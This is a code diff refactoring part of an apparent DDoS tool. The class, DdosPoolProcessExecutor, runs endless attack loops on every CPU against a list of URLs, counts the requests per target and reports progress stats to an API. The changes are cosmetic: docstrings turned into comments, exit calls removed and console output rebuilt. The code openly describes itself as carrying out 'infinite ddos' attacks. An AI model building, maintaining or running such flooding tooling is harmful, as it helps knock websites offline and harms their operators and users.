@@ -1,4 +1,3 @@
-import sys
 from multiprocessing import Pool, Manager, cpu_count
 
 from termcolor import cprint, colored
@@ -15,9 +14,7 @@ class DdosPoolProcessExecutor:
         self._threads_count = threads_count
         self._executed_results = manager.dict({url: 0 for url in urls})
 
-    """
-    Starts infinite ddos process on each CPU 
-    """
+    #  Starts infinite ddos process on each CPU
     def start(self):
         processes_count = cpu_count() - 1 or 1
         cprint(f'[*] Start DDOS on {processes_count} CPUs\n', 'cyan')
@@ -26,18 +23,16 @@ class DdosPoolProcessExecutor:
             try:
                 pool.map(self._start_single_process, range(processes_count))
             except KeyboardInterrupt:
-                sys.exit(cprint('\n[-] Canceled by user', 'red'))
+                cprint('\n[-] Canceled by user', 'red')
             except Exception as e:
-                sys.exit(cprint(f'\n[-] Something failed, exiting... {e}', 'red'))
+                cprint(f'\n[-] Something failed, exiting... {e}', 'red')
             finally:
                 cprint(f'\n[*] Submitting stats...', 'cyan')
                 self._api_instance.submit_progress(processes_count, self._executed_results)
                 cprint('[*] Successfully submitted requests stats:', 'green')
                 self._print_executed_results()
 
-    """
-    Starts an infinite loop of executing ddos attacks alternately on each url
-    """
+    # Starts an infinite loop of executing ddos attacks alternately on each url
     def _start_single_process(self, initial_index: int):
         i = initial_index
         while True:
@@ -52,10 +47,9 @@ class DdosPoolProcessExecutor:
             except KeyboardInterrupt:
                 break
 
-    """
-    Prints results to console
-    """
+    # Prints results to console
     def _print_executed_results(self):
-        print('\r[*] ', end='')
+        res = '\r[*] '
         for i, (url, count) in enumerate(self._executed_results.items()):
-            print(f'{url}: {colored(count, "green")}; ', end='')
+            res += f'{url}: {colored(count, "green")}; '
+        print(res, end='')
